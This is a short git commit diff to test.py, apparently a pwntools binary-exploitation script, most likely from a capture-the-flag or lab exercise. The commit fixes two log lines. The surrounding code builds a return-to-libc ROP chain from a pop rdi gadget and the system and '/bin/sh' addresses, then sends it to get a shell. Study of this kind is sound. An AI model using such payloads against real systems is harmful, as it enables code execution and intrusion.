7ada2db0167949cc815415ba61f170a7167ba638
montyshyama <montyshyama031@gmail.com>
2019-11-04 01:53:12 +0530

    Update test.py

--- test.py
+++ test.py
@@ -11,8 +11,8 @@ pop_rdi = p64(0x138C54A1)
 libc_system = p64(0xAB765F80)
 #strings -a -t x libc.so.6 | grep /bin/sh
 libc_binsh = p64(0x5643AB89) 
-log.info(f'System: {system_loc.hex()}')
-log.info(f'/bin/sh: {binsh_loc.hex()}')
+log.info(f'System: {libc_system.hex()}')
+log.info(f'/bin/sh: {libc_binsh.hex()}')
 payload_rce = padding
 payload_rce += pop_rdi + libc_binsh + libc_system
 p.sendline(payload_rce)
